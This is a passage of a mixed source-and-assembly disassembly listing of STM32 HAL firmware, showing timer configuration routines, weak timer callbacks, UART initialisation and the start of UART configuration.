 80051cc:	68fb      	ldr	r3, [r7, #12]
 80051ce:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 80051d2:	683b      	ldr	r3, [r7, #0]
 80051d4:	695b      	ldr	r3, [r3, #20]
 80051d6:	4313      	orrs	r3, r2
 80051d8:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 80051da:	687b      	ldr	r3, [r7, #4]
 80051dc:	68fa      	ldr	r2, [r7, #12]
 80051de:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 80051e0:	683b      	ldr	r3, [r7, #0]
 80051e2:	689a      	ldr	r2, [r3, #8]
 80051e4:	687b      	ldr	r3, [r7, #4]
 80051e6:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 80051e8:	683b      	ldr	r3, [r7, #0]
 80051ea:	681a      	ldr	r2, [r3, #0]
 80051ec:	687b      	ldr	r3, [r7, #4]
 80051ee:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 80051f0:	687b      	ldr	r3, [r7, #4]
 80051f2:	4a0c      	ldr	r2, [pc, #48]	; (8005224 <TIM_Base_SetConfig+0xbc>)
 80051f4:	4293      	cmp	r3, r2
 80051f6:	d007      	beq.n	8005208 <TIM_Base_SetConfig+0xa0>
 80051f8:	687b      	ldr	r3, [r7, #4]
 80051fa:	4a0b      	ldr	r2, [pc, #44]	; (8005228 <TIM_Base_SetConfig+0xc0>)
 80051fc:	4293      	cmp	r3, r2
 80051fe:	d003      	beq.n	8005208 <TIM_Base_SetConfig+0xa0>
 8005200:	687b      	ldr	r3, [r7, #4]
 8005202:	4a0a      	ldr	r2, [pc, #40]	; (800522c <TIM_Base_SetConfig+0xc4>)
 8005204:	4293      	cmp	r3, r2
 8005206:	d103      	bne.n	8005210 <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 8005208:	683b      	ldr	r3, [r7, #0]
 800520a:	691a      	ldr	r2, [r3, #16]
 800520c:	687b      	ldr	r3, [r7, #4]
 800520e:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 8005210:	687b      	ldr	r3, [r7, #4]
 8005212:	2201      	movs	r2, #1
 8005214:	615a      	str	r2, [r3, #20]
}
 8005216:	bf00      	nop
 8005218:	3714      	adds	r7, #20
 800521a:	46bd      	mov	sp, r7
 800521c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005220:	4770      	bx	lr
 8005222:	bf00      	nop
 8005224:	40012c00 	.word	0x40012c00
 8005228:	40014000 	.word	0x40014000
 800522c:	40014400 	.word	0x40014400

08005230 <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 8005230:	b480      	push	{r7}
 8005232:	b087      	sub	sp, #28
 8005234:	af00      	add	r7, sp, #0
 8005236:	60f8      	str	r0, [r7, #12]
 8005238:	60b9      	str	r1, [r7, #8]
 800523a:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 800523c:	68fb      	ldr	r3, [r7, #12]
 800523e:	6a1b      	ldr	r3, [r3, #32]
 8005240:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 8005242:	68fb      	ldr	r3, [r7, #12]
 8005244:	6a1b      	ldr	r3, [r3, #32]
 8005246:	f023 0201 	bic.w	r2, r3, #1
 800524a:	68fb      	ldr	r3, [r7, #12]
 800524c:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 800524e:	68fb      	ldr	r3, [r7, #12]
 8005250:	699b      	ldr	r3, [r3, #24]
 8005252:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 8005254:	693b      	ldr	r3, [r7, #16]
 8005256:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 800525a:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 800525c:	687b      	ldr	r3, [r7, #4]
 800525e:	011b      	lsls	r3, r3, #4
 8005260:	693a      	ldr	r2, [r7, #16]
 8005262:	4313      	orrs	r3, r2
 8005264:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 8005266:	697b      	ldr	r3, [r7, #20]
 8005268:	f023 030a 	bic.w	r3, r3, #10
 800526c:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 800526e:	697a      	ldr	r2, [r7, #20]
 8005270:	68bb      	ldr	r3, [r7, #8]
 8005272:	4313      	orrs	r3, r2
 8005274:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 8005276:	68fb      	ldr	r3, [r7, #12]
 8005278:	693a      	ldr	r2, [r7, #16]
 800527a:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 800527c:	68fb      	ldr	r3, [r7, #12]
 800527e:	697a      	ldr	r2, [r7, #20]
 8005280:	621a      	str	r2, [r3, #32]
}
 8005282:	bf00      	nop
 8005284:	371c      	adds	r7, #28
 8005286:	46bd      	mov	sp, r7
 8005288:	f85d 7b04 	ldr.w	r7, [sp], #4
 800528c:	4770      	bx	lr

0800528e <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 800528e:	b480      	push	{r7}
 8005290:	b087      	sub	sp, #28
 8005292:	af00      	add	r7, sp, #0
 8005294:	60f8      	str	r0, [r7, #12]
 8005296:	60b9      	str	r1, [r7, #8]
 8005298:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 800529a:	68fb      	ldr	r3, [r7, #12]
 800529c:	6a1b      	ldr	r3, [r3, #32]
 800529e:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 80052a0:	68fb      	ldr	r3, [r7, #12]
 80052a2:	6a1b      	ldr	r3, [r3, #32]
 80052a4:	f023 0210 	bic.w	r2, r3, #16
 80052a8:	68fb      	ldr	r3, [r7, #12]
 80052aa:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80052ac:	68fb      	ldr	r3, [r7, #12]
 80052ae:	699b      	ldr	r3, [r3, #24]
 80052b0:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 80052b2:	693b      	ldr	r3, [r7, #16]
 80052b4:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 80052b8:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 80052ba:	687b      	ldr	r3, [r7, #4]
 80052bc:	031b      	lsls	r3, r3, #12
 80052be:	693a      	ldr	r2, [r7, #16]
 80052c0:	4313      	orrs	r3, r2
 80052c2:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 80052c4:	697b      	ldr	r3, [r7, #20]
 80052c6:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 80052ca:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 80052cc:	68bb      	ldr	r3, [r7, #8]
 80052ce:	011b      	lsls	r3, r3, #4
 80052d0:	697a      	ldr	r2, [r7, #20]
 80052d2:	4313      	orrs	r3, r2
 80052d4:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 80052d6:	68fb      	ldr	r3, [r7, #12]
 80052d8:	693a      	ldr	r2, [r7, #16]
 80052da:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 80052dc:	68fb      	ldr	r3, [r7, #12]
 80052de:	697a      	ldr	r2, [r7, #20]
 80052e0:	621a      	str	r2, [r3, #32]
}
 80052e2:	bf00      	nop
 80052e4:	371c      	adds	r7, #28
 80052e6:	46bd      	mov	sp, r7
 80052e8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80052ec:	4770      	bx	lr

080052ee <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 80052ee:	b480      	push	{r7}
 80052f0:	b085      	sub	sp, #20
 80052f2:	af00      	add	r7, sp, #0
 80052f4:	6078      	str	r0, [r7, #4]
 80052f6:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 80052f8:	687b      	ldr	r3, [r7, #4]
 80052fa:	689b      	ldr	r3, [r3, #8]
 80052fc:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 80052fe:	68fb      	ldr	r3, [r7, #12]
 8005300:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005304:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 8005306:	683a      	ldr	r2, [r7, #0]
 8005308:	68fb      	ldr	r3, [r7, #12]
 800530a:	4313      	orrs	r3, r2
 800530c:	f043 0307 	orr.w	r3, r3, #7
 8005310:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 8005312:	687b      	ldr	r3, [r7, #4]
 8005314:	68fa      	ldr	r2, [r7, #12]
 8005316:	609a      	str	r2, [r3, #8]
}
 8005318:	bf00      	nop
 800531a:	3714      	adds	r7, #20
 800531c:	46bd      	mov	sp, r7
 800531e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005322:	4770      	bx	lr

08005324 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 8005324:	b480      	push	{r7}
 8005326:	b087      	sub	sp, #28
 8005328:	af00      	add	r7, sp, #0
 800532a:	60f8      	str	r0, [r7, #12]
 800532c:	60b9      	str	r1, [r7, #8]
 800532e:	607a      	str	r2, [r7, #4]
 8005330:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 8005332:	68fb      	ldr	r3, [r7, #12]
 8005334:	689b      	ldr	r3, [r3, #8]
 8005336:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8005338:	697b      	ldr	r3, [r7, #20]
 800533a:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 800533e:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 8005340:	683b      	ldr	r3, [r7, #0]
 8005342:	021a      	lsls	r2, r3, #8
 8005344:	687b      	ldr	r3, [r7, #4]
 8005346:	431a      	orrs	r2, r3
 8005348:	68bb      	ldr	r3, [r7, #8]
 800534a:	4313      	orrs	r3, r2
 800534c:	697a      	ldr	r2, [r7, #20]
 800534e:	4313      	orrs	r3, r2
 8005350:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 8005352:	68fb      	ldr	r3, [r7, #12]
 8005354:	697a      	ldr	r2, [r7, #20]
 8005356:	609a      	str	r2, [r3, #8]
}
 8005358:	bf00      	nop
 800535a:	371c      	adds	r7, #28
 800535c:	46bd      	mov	sp, r7
 800535e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005362:	4770      	bx	lr

08005364 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 8005364:	b480      	push	{r7}
 8005366:	b085      	sub	sp, #20
 8005368:	af00      	add	r7, sp, #0
 800536a:	6078      	str	r0, [r7, #4]
 800536c:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 800536e:	687b      	ldr	r3, [r7, #4]
 8005370:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005374:	2b01      	cmp	r3, #1
 8005376:	d101      	bne.n	800537c <HAL_TIMEx_MasterConfigSynchronization+0x18>
 8005378:	2302      	movs	r3, #2
 800537a:	e04f      	b.n	800541c <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 800537c:	687b      	ldr	r3, [r7, #4]
 800537e:	2201      	movs	r2, #1
 8005380:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 8005384:	687b      	ldr	r3, [r7, #4]
 8005386:	2202      	movs	r2, #2
 8005388:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 800538c:	687b      	ldr	r3, [r7, #4]
 800538e:	681b      	ldr	r3, [r3, #0]
 8005390:	685b      	ldr	r3, [r3, #4]
 8005392:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 8005394:	687b      	ldr	r3, [r7, #4]
 8005396:	681b      	ldr	r3, [r3, #0]
 8005398:	689b      	ldr	r3, [r3, #8]
 800539a:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 800539c:	687b      	ldr	r3, [r7, #4]
 800539e:	681b      	ldr	r3, [r3, #0]
 80053a0:	4a21      	ldr	r2, [pc, #132]	; (8005428 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80053a2:	4293      	cmp	r3, r2
 80053a4:	d108      	bne.n	80053b8 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 80053a6:	68fb      	ldr	r3, [r7, #12]
 80053a8:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 80053ac:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 80053ae:	683b      	ldr	r3, [r7, #0]
 80053b0:	685b      	ldr	r3, [r3, #4]
 80053b2:	68fa      	ldr	r2, [r7, #12]
 80053b4:	4313      	orrs	r3, r2
 80053b6:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 80053b8:	68fb      	ldr	r3, [r7, #12]
 80053ba:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80053be:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 80053c0:	683b      	ldr	r3, [r7, #0]
 80053c2:	681b      	ldr	r3, [r3, #0]
 80053c4:	68fa      	ldr	r2, [r7, #12]
 80053c6:	4313      	orrs	r3, r2
 80053c8:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 80053ca:	687b      	ldr	r3, [r7, #4]
 80053cc:	681b      	ldr	r3, [r3, #0]
 80053ce:	68fa      	ldr	r2, [r7, #12]
 80053d0:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 80053d2:	687b      	ldr	r3, [r7, #4]
 80053d4:	681b      	ldr	r3, [r3, #0]
 80053d6:	4a14      	ldr	r2, [pc, #80]	; (8005428 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80053d8:	4293      	cmp	r3, r2
 80053da:	d009      	beq.n	80053f0 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80053dc:	687b      	ldr	r3, [r7, #4]
 80053de:	681b      	ldr	r3, [r3, #0]
 80053e0:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80053e4:	d004      	beq.n	80053f0 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80053e6:	687b      	ldr	r3, [r7, #4]
 80053e8:	681b      	ldr	r3, [r3, #0]
 80053ea:	4a10      	ldr	r2, [pc, #64]	; (800542c <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 80053ec:	4293      	cmp	r3, r2
 80053ee:	d10c      	bne.n	800540a <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 80053f0:	68bb      	ldr	r3, [r7, #8]
 80053f2:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 80053f6:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 80053f8:	683b      	ldr	r3, [r7, #0]
 80053fa:	689b      	ldr	r3, [r3, #8]
 80053fc:	68ba      	ldr	r2, [r7, #8]
 80053fe:	4313      	orrs	r3, r2
 8005400:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 8005402:	687b      	ldr	r3, [r7, #4]
 8005404:	681b      	ldr	r3, [r3, #0]
 8005406:	68ba      	ldr	r2, [r7, #8]
 8005408:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 800540a:	687b      	ldr	r3, [r7, #4]
 800540c:	2201      	movs	r2, #1
 800540e:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005412:	687b      	ldr	r3, [r7, #4]
 8005414:	2200      	movs	r2, #0
 8005416:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 800541a:	2300      	movs	r3, #0
}
 800541c:	4618      	mov	r0, r3
 800541e:	3714      	adds	r7, #20
 8005420:	46bd      	mov	sp, r7
 8005422:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005426:	4770      	bx	lr
 8005428:	40012c00 	.word	0x40012c00
 800542c:	40014000 	.word	0x40014000

08005430 <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 8005430:	b480      	push	{r7}
 8005432:	b083      	sub	sp, #12
 8005434:	af00      	add	r7, sp, #0
 8005436:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 8005438:	bf00      	nop
 800543a:	370c      	adds	r7, #12
 800543c:	46bd      	mov	sp, r7
 800543e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005442:	4770      	bx	lr

08005444 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 8005444:	b480      	push	{r7}
 8005446:	b083      	sub	sp, #12
 8005448:	af00      	add	r7, sp, #0
 800544a:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 800544c:	bf00      	nop
 800544e:	370c      	adds	r7, #12
 8005450:	46bd      	mov	sp, r7
 8005452:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005456:	4770      	bx	lr

08005458 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 8005458:	b480      	push	{r7}
 800545a:	b083      	sub	sp, #12
 800545c:	af00      	add	r7, sp, #0
 800545e:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 8005460:	bf00      	nop
 8005462:	370c      	adds	r7, #12
 8005464:	46bd      	mov	sp, r7
 8005466:	f85d 7b04 	ldr.w	r7, [sp], #4
 800546a:	4770      	bx	lr

0800546c <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 800546c:	b580      	push	{r7, lr}
 800546e:	b082      	sub	sp, #8
 8005470:	af00      	add	r7, sp, #0
 8005472:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 8005474:	687b      	ldr	r3, [r7, #4]
 8005476:	2b00      	cmp	r3, #0
 8005478:	d101      	bne.n	800547e <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 800547a:	2301      	movs	r3, #1
 800547c:	e040      	b.n	8005500 <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 800547e:	687b      	ldr	r3, [r7, #4]
 8005480:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 8005482:	2b00      	cmp	r3, #0
 8005484:	d106      	bne.n	8005494 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 8005486:	687b      	ldr	r3, [r7, #4]
 8005488:	2200      	movs	r2, #0
 800548a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 800548e:	6878      	ldr	r0, [r7, #4]
 8005490:	f7fb fd78 	bl	8000f84 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 8005494:	687b      	ldr	r3, [r7, #4]
 8005496:	2224      	movs	r2, #36	; 0x24
 8005498:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 800549a:	687b      	ldr	r3, [r7, #4]
 800549c:	681b      	ldr	r3, [r3, #0]
 800549e:	681a      	ldr	r2, [r3, #0]
 80054a0:	687b      	ldr	r3, [r7, #4]
 80054a2:	681b      	ldr	r3, [r3, #0]
 80054a4:	f022 0201 	bic.w	r2, r2, #1
 80054a8:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 80054aa:	687b      	ldr	r3, [r7, #4]
 80054ac:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80054ae:	2b00      	cmp	r3, #0
 80054b0:	d002      	beq.n	80054b8 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 80054b2:	6878      	ldr	r0, [r7, #4]
 80054b4:	f000 fa54 	bl	8005960 <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 80054b8:	6878      	ldr	r0, [r7, #4]
 80054ba:	f000 f825 	bl	8005508 <UART_SetConfig>
 80054be:	4603      	mov	r3, r0
 80054c0:	2b01      	cmp	r3, #1
 80054c2:	d101      	bne.n	80054c8 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 80054c4:	2301      	movs	r3, #1
 80054c6:	e01b      	b.n	8005500 <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 80054c8:	687b      	ldr	r3, [r7, #4]
 80054ca:	681b      	ldr	r3, [r3, #0]
 80054cc:	685a      	ldr	r2, [r3, #4]
 80054ce:	687b      	ldr	r3, [r7, #4]
 80054d0:	681b      	ldr	r3, [r3, #0]
 80054d2:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 80054d6:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 80054d8:	687b      	ldr	r3, [r7, #4]
 80054da:	681b      	ldr	r3, [r3, #0]
 80054dc:	689a      	ldr	r2, [r3, #8]
 80054de:	687b      	ldr	r3, [r7, #4]
 80054e0:	681b      	ldr	r3, [r3, #0]
 80054e2:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 80054e6:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 80054e8:	687b      	ldr	r3, [r7, #4]
 80054ea:	681b      	ldr	r3, [r3, #0]
 80054ec:	681a      	ldr	r2, [r3, #0]
 80054ee:	687b      	ldr	r3, [r7, #4]
 80054f0:	681b      	ldr	r3, [r3, #0]
 80054f2:	f042 0201 	orr.w	r2, r2, #1
 80054f6:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 80054f8:	6878      	ldr	r0, [r7, #4]
 80054fa:	f000 fad3 	bl	8005aa4 <UART_CheckIdleState>
 80054fe:	4603      	mov	r3, r0
}
 8005500:	4618      	mov	r0, r3
 8005502:	3708      	adds	r7, #8
 8005504:	46bd      	mov	sp, r7
 8005506:	bd80      	pop	{r7, pc}

08005508 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 8005508:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 800550c:	b08a      	sub	sp, #40	; 0x28
 800550e:	af00      	add	r7, sp, #0
 8005510:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 8005512:	2300      	movs	r3, #0
 8005514:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 8005518:	68fb      	ldr	r3, [r7, #12]
 800551a:	689a      	ldr	r2, [r3, #8]
 800551c:	68fb      	ldr	r3, [r7, #12]
 800551e:	691b      	ldr	r3, [r3, #16]
 8005520:	431a      	orrs	r2, r3
 8005522:	68fb      	ldr	r3, [r7, #12]
 8005524:	695b      	ldr	r3, [r3, #20]
 8005526:	431a      	orrs	r2, r3
 8005528:	68fb      	ldr	r3, [r7, #12]
 800552a:	69db      	ldr	r3, [r3, #28]
 800552c:	4313      	orrs	r3, r2
 800552e:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 8005530:	68fb      	ldr	r3, [r7, #12]
 8005532:	681b      	ldr	r3, [r3, #0]
 8005534:	681a      	ldr	r2, [r3, #0]
 8005536:	4bb4      	ldr	r3, [pc, #720]	; (8005808 <UART_SetConfig+0x300>)
 8005538:	4013      	ands	r3, r2
 800553a:	68fa      	ldr	r2, [r7, #12]
 800553c:	6812      	ldr	r2, [r2, #0]
 800553e:	6a79      	ldr	r1, [r7, #36]	; 0x24
 8005540:	430b      	orrs	r3, r1
 8005542:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
